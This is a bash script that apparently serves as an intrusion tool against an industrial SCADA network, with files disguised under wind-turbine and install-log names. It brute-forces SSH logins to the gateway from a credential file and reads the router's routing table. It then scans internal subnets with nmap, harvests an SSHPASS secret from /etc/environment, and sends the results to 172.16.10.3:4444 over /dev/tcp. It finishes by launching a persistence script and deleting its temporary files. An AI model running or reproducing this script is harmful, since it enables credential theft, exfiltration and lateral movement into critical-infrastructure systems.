#!/bin/bash

# --- Config ---
# FTP_SERVER="${FTP_SERVER:-172.16.20.13}"
# FTP_USER="admin"
# FTP_PASS="password"
# Define the input file
CREDLIST="SCADA.conf"
SERVER_IP="172.16.10.3" 
SERVER_PORT="4444"
OUTPUT_FILE="WindTurbinePerformance.txt"
TMP_ROUTES="routes.txt"
TMP_SUBNETS="subnets.txt"
TMP_HOSTS="hosts.txt"
LOG_FILE="install.log"

# --- Step 1: Get Default Gateway ---
GATEWAY=$(ip route show | awk '/default/ {print $3}')

if [ -z "$GATEWAY" ]; then
    echo "[-] Could not determine default gateway"
    exit 1
fi

echo "[+] Default gateway: $GATEWAY" >> $LOG_FILE

# --- Step 2: Pull Routing Table via SSH ---
echo "[+] Querying router routing table..." >> $LOG_FILE


# Check if the file exists before proceeding
if [[ ! -f "$CREDLIST" ]]; then
    echo "Error: $CREDLIST not found."
    exit 1
fi

echo "[+] Starting credential iteration..." >> $LOG_FILE

# Iterate through the list
# IFS=":" tells the 'read' command to split the line at the colona
while IFS=":" read -r user pass; do
    # Skip empty lines or malformed lines without a colon
    [[ -z "$user" || -z "$pass" ]] && continue

    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
        "$user@$GATEWAY" "ip route show" > $TMP_ROUTES
    
    if [ -s "$TMP_ROUTES" ]; then
        echo "[+] Successful login with $user:$pass" >> $LOG_FILE
        break
    fi
done < "$CREDLIST"

if [ ! -s "$TMP_ROUTES" ]; then
    echo "[-] Failed to retrieve routing table" >> $LOG_FILE
    exit 1
fi

# # --- Step 3: Extract Internal Subnets (10.10.0.0/16 only) ---
echo "[+] Extracting internal subnets..." >> $LOG_FILE

grep -Eo '10\.10\.[0-9]+\.[0-9]+/24' "$TMP_ROUTES" | sort -u > "$TMP_SUBNETS"

if [ ! -s "$TMP_SUBNETS" ]; then
    echo "[-] No internal subnets found" >> $LOG_FILE
    exit 1
fi

echo "[+] Subnets identified:" >> $LOG_FILE
cat "$TMP_SUBNETS" >> $LOG_FILE

# # --- Step 4: Scan only those subnets for SSH ---
echo "[+] Running targeted scan..." >> $LOG_FILE

# nmap -p 22 --open -sS -T4 -iL "$TMP_SUBNETS" -oG "$TMP_HOSTS"
nmap -p 22 -n -sV --open --exclude "$GATEWAY/24" -sS -T4 -iL "$TMP_SUBNETS" -oG "$TMP_HOSTS"

# # --- Step 5: Filter out likely FRRouting routers ---
echo "[+] Filtering non-router hosts..." >> $LOG_FILE
# grep "/open/" "$TMP_HOSTS" | grep -viE 'OpenSSH 9.6' > "$OUTPUT_FILE"
grep "/open/" "$TMP_HOSTS" | grep -P '^.*?\b\d{1,2}\.\d{1,2}\.\d{1,2}\.[^1]{1,2}.*' > "$OUTPUT_FILE"

# Append environment variables to output file
echo "--- SSHPASS ---" >> $OUTPUT_FILE
source /etc/environment
echo $SSHPASS >> $OUTPUT_FILE

# # --- Step 6: Upload results ---
echo "[+] Uploading report..." >> $LOG_FILE
cat $OUTPUT_FILE > /dev/tcp/$SERVER_IP/$SERVER_PORT
# # curl -T "$OUTPUT_FILE" ftp://$FTP_USER:$FTP_PASS@$FTP_SERVER/

# # --- Step 7: Establish Persistence ---
echo "[+] Setting up background task..." >> $LOG_FILE
chmod +x Scada_update_schedular.sh
./Scada_update_schedular.sh &


echo "[+] Done" >> $LOG_FILE

# # --- Cleanup ---
rm -f "$TMP_ROUTES" "$TMP_SUBNETS" "$TMP_HOSTS" "$OUTPUT_FILE"